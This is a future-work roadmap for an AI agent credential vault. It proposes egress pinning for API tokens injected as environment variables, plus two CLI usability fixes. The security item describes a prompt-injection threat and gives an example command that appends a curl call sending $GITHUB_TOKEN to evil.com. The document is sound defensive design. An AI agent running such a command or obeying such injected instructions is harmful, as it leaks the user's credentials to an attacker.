# Future Work

Items collected from real-world usage testing and security review. Prioritized by impact.

---

## Security Enhancements

### 1. Command-level egress pinning for API credentials
**Context:** Browser credentials already have domain pinning — the vault checks the target URL before resolving the password. API credentials (injected as env vars into subprocesses) have no equivalent protection. A prompt injection could instruct the agent to run a command that exfiltrates the credential to an attacker-controlled endpoint (e.g., `gh pr list && curl -H "Authorization: $GITHUB_TOKEN" https://evil.com`).

**Proposed design:** Add an optional `allowedEgress` field to tool config:
```yaml
github:
  match: "gh *"
  env: GITHUB_TOKEN
  allowedEgress: ["github.com", "api.github.com"]
```

Before injecting, scan the command string for URLs and hostnames. If any URL doesn't match the allowed egress list, refuse to inject and log the blocked attempt to the audit log.

**Limitations (document honestly):**
- Obfuscated URLs, variable indirection, and DNS rebinding would bypass this
- Only inspects the command string, not what the subprocess actually does at the network level
- Defense-in-depth measure that raises the bar, not a complete solution

**Complements:** This extends the domain pinning concept from browser credentials to API credentials, using the same philosophy — check before resolving, not after.

---

## UX Improvements

### 1. Fuzzy match on tool name not found
**Trigger:** `openclaw vault remove gumroad-password` → "not found"
**Current behavior:** Hard fail with no help.
**Desired behavior:** Show fuzzy matches — "Did you mean one of these?"
```
Tool "gumroad-password" not found. Similar tools in vault:
  - gumroad-login
  - gumroad-api
  - gumroad-session
```
**Applies to:** All commands that take a tool name (`show`, `remove`, `rotate`, `test`, `logs --tool`)

### 2. `vault logs --last N` should accept a count
**Trigger:** `openclaw vault logs --last 5` to see last 5 entries
**Current behavior:** `--last` only accepts a duration string (e.g. `24h`, `7d`, `30m`).
**Desired behavior:** Also accept a plain number — `--last 10` shows the 10 most recent log entries regardless of time.

---

*More items will be added as testing continues.*
